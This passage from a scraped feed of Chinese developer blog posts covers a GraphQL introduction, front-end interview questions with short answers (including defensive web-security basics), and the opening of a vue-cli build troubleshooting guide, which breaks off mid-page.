href=\"https://link.juejin.im?target=http%3A%2F%2Ffacebook.github.io%2Fgraphql%2FOctober2016%2F%23sec-Type-System\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">规范文档</a>了解。</p><p>接下来简单介绍下 GraphQL 的 SDL 语法：</p><h3 data-id=\"heading-10\">定义 API Schema</h3><p>自定义类型的定义主要是在服务端完成的，语法如下：</p><pre class=\"hljs bash\"><code><span class=\"hljs-built_in\">type</span> 类型名 {\n    字段名: 类型\n}\n</code></pre><p>此外， GraphQL 还有 <code>Query</code>, <code>Mutation</code>, <code>Subscription</code> 等特殊的根类型，用于定义 API Schema 。我们可以定义一个用户：</p><pre class=\"hljs bash\"><code><span class=\"hljs-built_in\">type</span> User {\n    id: Int!\n    name: String\n}\n</code></pre><p>然后定义几个用于数据操作的 API Schema ：</p><pre class=\"hljs bash\"><code><span class=\"hljs-built_in\">type</span> Query { // 基本查询 Schema\n    user(id: Int!): User // 传入一个 id ，返回具体用户\n}\n\n<span class=\"hljs-built_in\">type</span> Mutation { // 操作数据的 Schema\n    createUser( // 传入用户名自动创建一个用户\n        name: String\n    ): User\n}\n\n<span class=\"hljs-built_in\">type</span> Subscription { // 监听数据变更的 Schema\n    userChanged: User\n}\n</code></pre><h3 data-id=\"heading-11\">数据操作</h3><p>有了这些定义好的 API Schema ，我们就可以此来发起数据操作了。 GraphQL 的数据操作也分为 <code>Query</code>, <code>Mutation</code>, <code>Subscription</code> 三种类型。简单来讲， <code>Query</code> 就是获取数据的基本查询；<code>Mutation</code> 支持对数据的增、删、改等操作；而 <code>Subscription</code> 则用于监听数据变动、并靠 Websocket 等协议推送变动的消息给订阅方。</p><p>基于前面的定义的用户 Schema ，我们可以写出如下的数据操作：</p><pre class=\"hljs bash\"><code>query {\n  user(id:3) { // 查询用户 id 为3的用户\n    name\n  }\n}\n\nmutation {\n  createUser(name: <span class=\"hljs-string\">\"Tom\"</span>) { // 新增一个名为 <span class=\"hljs-string\">\"Tom\"</span> 的用户\n    name\n    id\n  }\n}\n\nsubscription {\n  userChanged { // 监听用户数据变动\n    name\n    id\n  }\n}\n</code></pre><p>上面这些查询，根字段之后的所有内容称为查询的 payload 。服务端会按查询格式，在 <code>data</code> 字段返回 payload 中指定的数据，比如 <code>createUser</code> 这个操作就会返回如下的数据：</p><pre class=\"hljs bash\"><code>{\n  <span class=\"hljs-string\">\"data\"</span>: {\n    <span class=\"hljs-string\">\"createUser\"</span>: {\n      <span class=\"hljs-string\">\"name\"</span>: <span class=\"hljs-string\">\"Tom\"</span>,\n      <span class=\"hljs-string\">\"id\"</span>: 9\n    }\n  }\n}\n</code></pre><h2 data-id=\"heading-12\">GraphQL 生态圈</h2><p>通过 API Schema，我们既可指定 API 功能、同时也能定义客户端如何请求数据。但前面介绍的只是个规范，而这个 GraphQL 的规范又是如何落地实现的呢？接下来会围绕服务端、客户端、调试工具，介绍下 GraphQL 应用开发的 “生态圈”。</p><h3 data-id=\"heading-13\">服务端实现</h3><p>在服务端， GraphQL 服务器可用任何可构建 Web 服务器的语言实现。除 JavaScript 之外， Ruby ， Python ， Scala ， Java ， Clojure ， Go 和 .NET 都有实现供参考。</p><p>服务端查询执行的核心算法也很简单：就是查询逐字段遍历，并为各字段执行一个 resolver 以处理数据操作。下图举了一个例子：</p><p><img alt=\"\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/3/6bb578106e51fab277a644a57685b8a3?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"></p><p>最左边为一个 GraphQL 查询，该语句查询了 id 为 <code>'abc'</code> 的作者所有文章的标题和内容。中间一副图展示了每个查询字段对应的数据类型，然后在最右边可看到每个字段的解析过程：首先查询 id 为 <code>'abc'</code> 的作者，再从该作者处获取其所有文章；而由于文章是一个列表，最后我们还要遍历这个列表以获取各文章对应的标题、内容。</p><p>这个逐字段解析的流程清晰易懂，但如果服务器只是这么实现的话，就会面临性能问题。见下图的例子，若用户要查询文章列表下各个作者的信息，由于文章列表中可能有大量重复的作者，当处理到同一作者的文章时就要重复查询该作者信息，甚至当“查询作者信息”这操作本身就包含大量子操作的话、对服务器性能的消耗就非常可观：</p><p><img alt=\"\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/3/a217006a52668c89346f86cc97033867?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"></p><p>对这种一个查询触发大量相同的数据操作的问题，一种解决思路是将数据操作改为批量处理。还是用上面的例子，下图中我们把查询作者信息的操作改为存入一个队列，待合适的时机再批量发起查询，这时查询的数量就只是队列里的一个最小子集，避免了重复操作。 Facebook 推出的<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Ffacebook%2Fdataloader\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"> DataLoder </a>就是一个这样的数据批量处理和缓存的方案。</p><p><img alt=\"\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/3/74b018279d630b7f1f45a2f9cc19f185?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"></p><p>上面讨论了 GraphQL 服务端的基本实现思路，而针对 Node.js 的实现，我基于前文示例中的 API Schema 写了一个简单的 <a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Flevonlin%2Fgraphql-server-demo\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Demo</a> ，读者可了解下 GraphQL 的服务端具体是如何实现和使用的。</p><h3 data-id=\"heading-14\">客户端实现</h3><p>常见的 GraphQL 客户端库有：</p><ul><li><a href=\"https://link.juejin.im?target=https%3A%2F%2Ffacebook.github.io%2Frelay%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Relay</a>：Facebook 官方的 GraphQL 客户端，它大大优化了性能，但只能在 Web 上可用</li><li><a href=\"https://link.juejin.im?target=http%3A%2F%2Fdev.apollodata.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Apollo</a>：一个开源社区项目，旨在为所有开发平台（Web, 安卓, iOS , React Native 等）构建强大而灵活的 GraphQL 客户端</li></ul><p>至于如何使用这两个客户端库，可以参考官方文档，这里不再赘述。而对于 Apollo 的入门，<a href=\"https://link.juejin.im?target=https%3A%2F%2Fdev-blog.apollodata.com%2Ffull-stack-react-graphql-tutorial-582ac8d24e3b\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"> Full-stack React + GraphQL Tutorial </a>一文提供了深入浅出的示例，建议动手尝试下，构建自己第一个 GraphQL 应用吧。</p><h3 data-id=\"heading-15\">开发工具</h3><p>GraphQL 有大量实用的开发工具，基本都是基于 introspection 查询实现的。所谓 introspection 查询，就是指客户端向服务器询问 API Schema 信息的查询。比如，我们可以通过查询 <code>__schema</code> 等元字段来获取完整的类型信息：</p><pre class=\"hljs bash\"><code>query {\n  __schema {\n    types {\n      name // 获取根字段名\n      fields {\n        name // 获取字段名\n      }\n    }\n  }\n}\n</code></pre><p>有了这样一个查询 Schema 信息的功能，就使得 GraphQL 的文档浏览器，自动补全，代码生成等开发工具非常容易实现。而开发工具中，最有名的就是 <a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fgraphql%2Fgraphiql\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">GraphiQL</a> 了，其本质上可认为是个 GraphQL 客户端，但配有编辑、自动补全、文档浏览等功能，常用于服务端的调试。</p><p>前面我们那个<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Flevonlin%2Fgraphql-server-demo\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">服务端 Demo </a>也以中间件形式引入了基于 GraphiQL 的调试工具 <a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fgraphcool%2Fgraphql-playground\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">GraphQL PlayGround </a>。运行 Demo 后，你可以访问 <code>localhost:3000/playground</code> 试试上面列举的所有查询~</p><h2 data-id=\"heading-16\">GraphQL 存在的问题</h2><p>当然， GraphQL 也不是完美无缺的，现在 GraphQL 主要存在安全性和服务端缓存能力两方面的问题。</p><h3 data-id=\"heading-17\">安全问题</h3><p>GraphQL 声明式的的数据查询提供了灵活、易拓展的接口；但如果我们发起的一次查询包含了过多的数据操作，那么这一次查询就会给数据服务器的带来巨大的压力，提升了被 DDOS 的风险。</p><p>此外，每次发起的查询语句，实质上也反映了查询文档的结构，如果被攻击者截取了我们的请求、拼凑出完整的接口内容，这也不利于接口的安全。</p><p>面对查询压力，我们可以通过服务端限流、客户端限流等措施来进行缓解，具体限流的措施可参见<a href=\"https://link.juejin.im?target=https%3A%2F%2Fsegmentfault.com%2Fa%2F1190000011059162\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">这篇文章</a>。</p><p>而对于 API 结构公开传输的问题，有人提出一个<a href=\"https://link.juejin.im?target=https%3A%2F%2Fdev-blog.apollodata.com%2Fpersisted-graphql-queries-with-apollo-client-119fd7e6bba5\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">持久化查询</a>的方案。简单来讲，就是客户端和服务端分别将约定好查询内容转换为查询ID，转而使用查询ID进行查询。这样一来既解决了查询语句公开传输的问题，而只传 ID 还顺便减少了传输的数据量、提升了传输速度。</p><h3 data-id=\"heading-18\">服务端缓存能力</h3><p>GraphQL 能让客户端灵活地请求数据，这就样一来客户端请求内容就是不确定的，服务端难以根据同一个连接来维护查询缓存。</p><p>关于这个问题，前面提到 Facebook 有一个<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Ffacebook%2Fdataloader\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"> DataLoader </a>的技术，可用于实现查询的批量处理和缓存，但其文档中描述的缓存也只是针对单个请求进行、粒度还是较粗。</p><h2 data-id=\"heading-19\">总结</h2><p>GraphQL 作为一个新的 API 标准，通过声明式的数据获取方式，给客户端提供了简洁、灵活、高效的数据查询。适应了移动互联网时代客户端技术的快速发展和需求的快速迭代，是当前 REST 模式的有力竞争者。</p><p>同时其活跃的社区和日渐成熟的生态圈也证明了这是一个很有生命力的技术，目前 GraphQL 已被许多的公司（ Facebook ， GitHub ， Twitter 等等）用于生产环境中，相信其未来还有很大的发展前景。</p><p>但 GraphQL 自身存在的安全性等问题也不容忽视；此外引入 GraphQL 势必存在学习成本，在 API 设计思想上的变化页还会影响到相应的开发模式、开发流程。所以只有权衡好引入成本和收益，才能让这项新技术用在刀刃上。</p><h2 data-id=\"heading-20\">Ref</h2><p><a href=\"https://link.juejin.im?target=http%3A%2F%2Fgraphql.org%2Flearn%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">官方文档</a><br><a href=\"https://link.juejin.im?target=https%3A%2F%2Fsegmentfault.com%2Fa%2F1190000010259012\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">[译] 怎样使用GraphQL（文中架构图引用自该教程）</a></p><p><br></p></div>"},null,{"title":"道阻且长啊TAT(前端面试总结) 附答案 － 上","avatar":"https://avatars3.githubusercontent.com/u/9276376?v=3","author":"febobo","create_time":"2017 年 10 月 11 日","tags":["面试"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><p>之前在 <a href=\"https://link.juejin.im?target=https%3A%2F%2Fsegmentfault.com%2Fa%2F1190000010631325\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">segmentfault.com/a/119000001…</a> 看到过这篇文章，最近闲下来就做着玩了一下， 如有误，还请斧正</p>\n<h2 id=\"-\" data-id=\"heading-0\">腾讯一面</h2>\n<ul>\n<li><p>1.浏览器工作原理 </p>\n<ul>\n<li>用户界面－ 包括地址栏、后退/前进按钮、书签目浏览器引擎－ 用来查询及操作渲染引擎的接口</li>\n<li>渲染引擎－ 渲染界面:Firefox、Chrome和Safari是基于两种渲染引擎构建的，Firefox使用Geoko——Mozilla自主研发的渲染引擎，Safari和Chrome都使用webkit.</li>\n<li>网络－ 用来完成网络调用，例如http请求 UI 后端－ 用来绘制类似组合选择框及对话框等基本组件，具有不特定于某个平台的通用接口，底层使用操作系统的用户接口</li>\n<li>JS解释器－ 解释执行JS代码</li>\n<li>数据存储－ 属于持久层，浏览器需要在硬盘中保存类似cookie的各种数据</li>\n</ul>\n</li>\n<li><p>2.Web安全,举例说明</p>\n<ul>\n<li>xss</li>\n<li>https</li>\n<li>混合内容</li>\n<li>同源策略 </li>\n</ul>\n</li>\n<li>3.状态码<ul>\n<li>1xx 信息</li>\n<li>2xx 成功</li>\n<li>3xx 重定向</li>\n<li>4xx 客户端错误</li>\n<li>5xx 服务端错误</li>\n</ul>\n</li>\n<li>4.同源<ul>\n<li>同端口</li>\n<li>同域名</li>\n<li>同协议</li>\n</ul>\n</li>\n<li><p>5.对象继承 </p>\n<ul>\n<li>所有继承都是基于原型(prorotype)的,由于js继承机制并不是明确规定的,所以继承的方式也特别多<ul>\n<li>原型链继承<pre><code class=\"hljs bash\">  Child.prototype = new Parent();</code></pre></li>\n<li>原型继承<pre><code class=\"hljs bash\">  Child.prototype = Parent.prototype;\n  Child.prototype.constructor = Child;</code></pre></li>\n<li>拷贝继承(extend)</li>\n<li>call,apply</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>6.ES6历史以及新特性有哪些?</p>\n<ul>\n<li>......</li>\n</ul>\n</li>\n<li>7.promise原理<ul>\n<li>理解promise 主要使用场景，理解promise 几个状态(pending,fulilled,rejected)</li>\n</ul>\n</li>\n<li><p>8.事件模型</p>\n<ul>\n<li>DOM0级模型 <code>div.onclick = fn()</code></li>\n<li>DOM2级模型 <code>addEventListener(eventType, handler, useCapture)</code></li>\n<li>IE事件模型 <code>attachEvent( \"eventType\",\"handler\")</code></li>\n</ul>\n</li>\n<li><p>9.常见兼容性问题,列举(移动端/PC端)</p>\n</li>\n<li>10.性能优化<ul>\n<li>减少http请求</li>\n<li>静态资源压缩</li>\n<li>CDN加速</li>\n<li>减少全局变量</li>\n<li>script标签放至body后</li>\n</ul>\n</li>\n</ul>\n<p>腾讯二面（机试）<br>类似百度搜索的提示框，兼容各大浏览器，可用键盘控制. 勉强憋了出来，但是挂掉了，犯了一些低级错误，显示经验不足． 面试官建议多看书，多写组件.</p>\n<h2 id=\"-\" data-id=\"heading-1\">阿里一面</h2>\n<ul>\n<li>1.Ajax原理<ul>\n<li>create =&gt; open =&gt; send =&gt; onchange</li>\n</ul>\n</li>\n<li>2.浏览器解析过程<ul>\n<li>流程： 解析html =&gt; 构建dom树-&gt;构建render树-&gt;布局render树-&gt;绘制render树</li>\n</ul>\n</li>\n<li>3.垂直居中<ul>\n<li>flex</li>\n<li>line-height, text-center</li>\n<li>postion , margin</li>\n<li>display: table, vertical-align: middle</li>\n<li>position, top:0, bottom: 0</li>\n</ul>\n</li>\n<li>4.数据类型判断<ul>\n<li>typeof</li>\n<li>instanceof</li>\n<li>toString</li>\n</ul>\n</li>\n<li>5.路由实现<ul>\n<li>location.hash+hashchange</li>\n<li>history.pushState()+popState</li>\n</ul>\n</li>\n<li>6.数据本地存储<ul>\n<li>localStorage</li>\n<li>indexDB</li>\n<li>cookie</li>\n<li>seesionStorage</li>\n</ul>\n</li>\n<li>7.跨域<ul>\n<li>jsonp</li>\n<li>cors</li>\n</ul>\n</li>\n<li>8.数据双向绑定单向绑定优缺点<ul>\n<li>双向绑定是自动管理状态的，对处理有用户交互的场景非常合适，代码量少，当项目越来越大的时候，调试也变得越来越复杂，难以跟踪问题</li>\n<li>单向绑定是无状态的, 程序调试相对容易, 可以避免程序复杂度上升时产生的各种问题, 当然写代码时就没有双向绑定那么爽了 </li>\n</ul>\n</li>\n</ul>\n<h2 id=\"-\" data-id=\"heading-2\">阿里二面</h2>\n<ul>\n<li>1.无线性能优化<ul>\n<li>往上翻，有同样的问题</li>\n</ul>\n</li>\n<li>2.Tap事件,Touch<ul>\n<li>Tap 是zepto库封装好的事件，在移动端上可以替代click 事件，从而规避300ms问题</li>\n<li>Touch 是移动端上的手势事件, 如 touchstart , touchend , touchmove</li>\n</ul>\n</li>\n<li>3.数据存储<ul>\n<li>往上翻，有同样的问题<br>搜狐一面</li>\n</ul>\n</li>\n<li>1.Dom操作<ul>\n<li>增删改查, 如：<ul>\n<li>document.elementById</li>\n<li>document.querySelectAll</li>\n<li>document.appendChild</li>\n<li>docuemnt.removeChild</li>\n<li>......</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>2.移动布局方案<ul>\n<li>Rem, Em</li>\n<li>flex</li>\n<li>百分比</li>\n<li>media query</li>\n</ul>\n</li>\n<li>3.前后端协作<ul>\n<li>.....</li>\n</ul>\n</li>\n<li>4.原生Ajax实现过程<ul>\n<li>往上翻，有同样的问题<br>搜狐二面</li>\n</ul>\n</li>\n<li>1.单链表反转<pre><code class=\"hljs bash\">  <span class=\"hljs-keyword\">function</span> ReverseList(pHead) {\n      var pre = null;\n      var next = null;\n      <span class=\"hljs-keyword\">while</span> (pHead != null) {\n      next = pHead.next;\n      pHead.next = pre;\n      pre = pHead;\n      pHead = next;\n      }\n      <span class=\"hljs-built_in\">return</span> pre;\n  }</code></pre></li>\n<li><p>2.快排</p>\n<pre><code class=\"hljs bash\">  const quickSort = (arr) =&gt; {\n      <span class=\"hljs-keyword\">if</span>(arr.length &lt; 1) <span class=\"hljs-built_in\">return</span> arr;\n      <span class=\"hljs-built_in\">let</span> inx = Math.floor(arr.length/2);\n      <span class=\"hljs-built_in\">let</span> pivot = arr.splice(inx,1)[0];\n      <span class=\"hljs-built_in\">let</span> left = [];\n      <span class=\"hljs-built_in\">let</span> right = [];\n      <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-built_in\">let</span> i=0; i&lt;arr.length; i++){\n      <span class=\"hljs-keyword\">if</span>(arr[i] &lt; pivot){\n          left.push(arr[i])\n      }<span class=\"hljs-keyword\">else</span>{\n          right.push(arr[i])\n      }\n      }\n\n      <span class=\"hljs-built_in\">return</span> quickSort(left).concat(pivot,quickSort(right))\n  }</code></pre></li>\n<li>3.即时通信(除了Ajax和websocket)<ul>\n<li>Comet技术：基于HTTP长连接的Web端实时通信技术</li>\n<li>SSE：服务器发送事件,使用长链接进行通讯</li>\n</ul>\n</li>\n<li>4.服务器代理转发如何处理cookie(nginx) <pre><code class=\"hljs bash\">  proxy_cookie_domain localhost example.org;\n  proxy_cookie_domain ~\\.([a-z]+\\.[a-z]+)$ <span class=\"hljs-variable\">$1</span>;\n  proxy_cookie_path /one/ /;\n  proxy_cookie_path / /two/;</code></pre></li>\n<li>5.对象继承<ul>\n<li><strong>proto</strong></li>\n<li>prototype</li>\n<li>Object</li>\n</ul>\n</li>\n<li>6.this<ul>\n<li>构造函数调用</li>\n<li>apply,call使用</li>\n<li>对象的方法调用</li>\n<li>普通函数调用</li>\n</ul>\n</li>\n<li>7.rem布局的优缺点 </li>\n</ul>\n<h2 id=\"-alloy-team\" data-id=\"heading-3\">腾讯Alloy Team</h2>\n<p>一面(记录两个,其他都还好)</p>\n<ul>\n<li>实现动画有哪些途径 <ul>\n<li>CSS3</li>\n<li>JS帧动画,定时器,requestAnimateFrame</li>\n<li>Canvas动画</li>\n<li>SVG</li>\n<li>图片</li>\n</ul>\n</li>\n<li>web安全<ul>\n<li>https加密过程,证书用途<ul>\n<li>服务端配置证书 -&gt; 传送证书 -&gt; 客户端解析证书 -&gt; 传送加密信息 -&gt; 服务端解密信息 -&gt; 传输加密后信息 -&gt; 客户端解密信息</li>\n</ul>\n</li>\n<li>xss几种形式,防范手段,过滤哪些字符?<ul>\n<li>形式<ul>\n<li>数据从一个不可靠的链接进入到一个web应用程序</li>\n<li>没有过滤掉恶意代码的动态内容被发送给web用户</li>\n</ul>\n</li>\n<li>防范手段<ul>\n<li>不信任任何用户的输入(过滤，转义)</li>\n<li>使用HTTP头指定类型</li>\n</ul>\n</li>\n<li>过滤字符<ul>\n<li>&lt;,&gt;,\",&amp;quot</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>xsrf原理,实例,防范手段(Laravel的token)</li>\n<li>Sql注入<ul>\n<li>前端恶意提交sql代码,来篡改服务端的sql执行代码</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>性能优化<ul>\n<li>代码优化(html,css,js)</li>\n<li>网络性能优化:<ol>\n<li>Cache缓存之强制缓存和协商缓存</li>\n<li>CDN原理及应用</li>\n<li>HTTP压缩之gzip</li>\n</ol>\n</li>\n</ul>\n</li>\n<li>上下文环境对象</li>\n<li><p>设计模式(要求说出如何实现,应用,优缺点): </p>\n<ul>\n<li><p>单例模式</p>\n<ul>\n<li>定义: 产生一个类的唯一实例</li>\n<li><p>实现: </p>\n<pre><code class=\"hljs bash\">  const createMask = ()=&gt;{\n      <span class=\"hljs-built_in\">let</span> mask = null;\n      <span class=\"hljs-built_in\">return</span> ()=&gt; mask || document.appendChild(document.createElement(<span class=\"hljs-string\">'div'</span>))\n  }\n\n  const mask = createMask();</code></pre></li>\n<li>优点:<ol>\n<li>提供了对唯一实例的受控访问</li>\n<li>避免对共享资源的多重占用</li>\n<li>节约系统资源</li>\n</ol>\n</li>\n<li>缺点:<ol>\n<li>扩展性差</li>\n<li>职责过重</li>\n</ol>\n</li>\n</ul>\n</li>\n<li>工厂模式<ul>\n<li>定义: 创建对象时无须指定创建对象的具体灯</li>\n<li>实现: <pre><code class=\"hljs bash\">  const Example = <span class=\"hljs-keyword\">function</span>(name,age){\n      this.name = name || <span class=\"hljs-string\">'Tom'</span>,\n      this.age = age || <span class=\"hljs-string\">'18'</span>\n      this.say = <span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span>(){\n          console.log(`name:<span class=\"hljs-variable\">${this.name}</span>,age:<span class=\"hljs-variable\">${this.age}</span>`)\n      }\n  }</code></pre></li>\n<li>优点:<ol>\n<li>结构清淅,有效的封装变化 </li>\n<li>对调用者屏蔽具体实现， 调用者只需关心产品的接口</li>\n<li>降低耦合度</li>\n</ol>\n</li>\n<li>缺点:<ol>\n<li>添加新的类，需要改写工厂类</li>\n</ol>\n</li>\n</ul>\n</li>\n<li><p>发布订阅模式</p>\n<ul>\n<li>定义: 定义对象间一种一对多的依赖关系，使得当每一个对象改变状态，则所有依赖于它的对象都会得到通知并自动更新。</li>\n<li><p>实现: </p>\n<pre><code class=\"hljs bash\">  const Example = {};\n  Example.clientList = [];\n  Example.listen = <span class=\"hljs-keyword\">function</span>(fn){\n      this.clientList.push(fn)\n  }\n  Example.trigger = <span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span>(){\n      <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-built_in\">let</span> i=0,fn; fn=this.clientList[i++]){\n          fn.apply(this,arguments)\n      }\n  }\n\n  Example.listen(<span class=\"hljs-keyword\">function</span>(message){\n      console.log(message) // 我发布了一个消息，此时订阅者会收到消息\n  })  \n\n  Example.trigger(<span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span>(){\n      console.log(<span class=\"hljs-string\">'我发布了一个消息，此时订阅者会收到消息'</span>)\n  })</code></pre></li>\n<li>优点:<ol>\n<li>时间上的解藕 </li>\n<li>对象之间的解藕</li>\n<li>支持广播通信</li>\n</ol>\n</li>\n<li>缺点:<ol>\n<li>如果一个观察目标对象有很多直接和间接的观察者的话，将所有的观察者都通知到会花费很多时间</li>\n<li>如果在观察者和观察目标之间有循环依赖的话，观察目标会触发它们之间进行循环调用，可能导致系统崩溃</li>\n<li>观察者模式没有相应的机制让观察者知道所观察的目标对象是怎么发生变化的，而仅仅只是知道观察目标发生了变化</li>\n</ol>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>跨域(产生原因)<ul>\n<li>JSONP原理<ul>\n<li>利用script标签没有跨域的漏洞进行第三方通信，第三方的响应数据为json，故称之为jsonp (json padding)</li>\n</ul>\n</li>\n<li>CORS如何设置<ul>\n<li>通过改变response headers 设置白名单,来允许指定origin进行通信</li>\n</ul>\n</li>\n<li>Nginx代理<pre><code class=\"hljs bash\">  location / {\n      proxy_pass  xxx\n  }</code></pre></li>\n</ul>\n</li>\n<li>读过哪些框架源码?</li>\n<li>如何写一个CSS库,要注意哪些东西?<ol>\n<li>总是类名优先</li>\n<li>组件代码放在一起</li>\n<li>使用一致的类命名空间</li>\n<li>维护命名空间和文件名之间的严格映射</li>\n<li>避免组件外的样式泄露</li>\n<li>避免组件内的样式泄露</li>\n<li>遵守组件边界</li>\n<li>松散地整合外部样式</li>\n</ol>\n</li>\n</ul>\n</div>"},{"title":"vue-cli npm run build空白页的两个坑 webpack gzip文件压缩优化打包文件","avatar":"https://user-gold-cdn.xitu.io/2017/12/22/1607d2bb387d545d?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"OBKoro1","create_time":"2017 年 10 月 10 日","tags":["Vue.js","Webpack"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><h2 id=\"-\" data-id=\"heading-0\">写在前面：</h2>\n<p>npm run build 是vue-cli用来打包项目的命令行，本文是关于vue-cli打包的一些常见的坑，会尽量详细的写每个步骤，大家可以一边看着文章，一边打包试试。有需要的朋友可以做一下参考，喜欢的可以点波赞，或者关注一下，希望可以帮到大家。</p>\n<h2 id=\"-\" data-id=\"heading-1\">初始化一个项目：</h2>\n<p>这里初始化一个项目，因为导致打包错误的原因多种多样，避免因为其他设置错误干扰，<strong>从头开始打包整体步骤也会更加清晰</strong>。</p>\n<h3 id=\"-\" data-id=\"heading-2\">命令行：</h3>\n<pre><code class=\"hljs bash\">vue init webpack build1(项目名)\n//吧啦吧啦进行一波设置\n//进入项目文件夹\nnpm install</code></pre><p>如果还不清楚如何初始化运行一个项目，可以参考我之前写的一篇文章：<a href=\"https://link.juejin.im?target=https%3A%2F%2Fjuejin.im%2Fpost%2F597eee92f265da3e2e56e37c\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">传送门</a>。  </p>\n<h2 id=\"-\" data-id=\"heading-3\">开始打包踩坑</h2>\n<h3 id=\"-\" data-id=\"heading-4\">命令行：</h3>\n<pre><code class=\"hljs bash\">//直接打包\nnpm run build</code></pre><h3 id=\"-\" data-id=\"heading-5\">打包出来的文件</h3>\n<p></p><figure><img alt=\"vue-cli项目文件打包位置\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/9/26/0324afbbfce9a0baf513417e07292c6b?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption>vue-cli项目文件打包位置</figcaption></figure><p></p>\n<h3 id=\"-\" data-id=\"heading-6\">第一个坑：文件引用路径</h3>\n<p>现在项目我们什么都没动，是初始化之后直接打包的状态，打开dist/index.htmnl文件整个网页都是一片空白的。</p>\n<p></p><figure><img alt=\"\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/9/26/609c0d3e25e99744930d81e892156f0b?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>打开调试，发现有一排报错说是：<code>不能加载到资源</code>，后面就发现<strong>路径的问题</strong>，仔细看上面再看上面加载的css的引用路径，这里是有问题的。</p>\n<h3 id=\"-\" data-id=\"heading-7\">爬坑：</h3>\n<p><strong>文件位置：</strong>config文件夹/index.js文件</p>\n<h4 id=\"1-assetspublicpath-\" data-id=\"heading-8\">1.更改assetsPublicPath属性：</h4>\n<p>文件里面有两个assetsPublicPath属性，更改第一个，也就是更改build里面的assetsPublicPath属性：</p>\n<pre><code class=\"hljs bash\">assetsPublicPath:<span class=\"hljs-string\">'/'</span>//<span class=\"hljs-literal\">false</span>\nassetsPublicPath:<span class=\"hljs-string\">'./'</span>//<span class=\"hljs-literal\">true</span></code></pre><p>assetsPublicPath属性作用是指定编译发布的根目录，<strong>'/'指的是项目的根目录 ，'./'指的是当前目录。</strong></p>\n<h4 id=\"2-\" data-id=\"heading-9\">2.改好设置之后，重新打包。</h4>\n<p>打开打包文件：</p>\n<p></p><figure><img alt=\"重新打开index.html\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/9/26/f4afd954cdb3dc6702dbae4a8066441a?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; 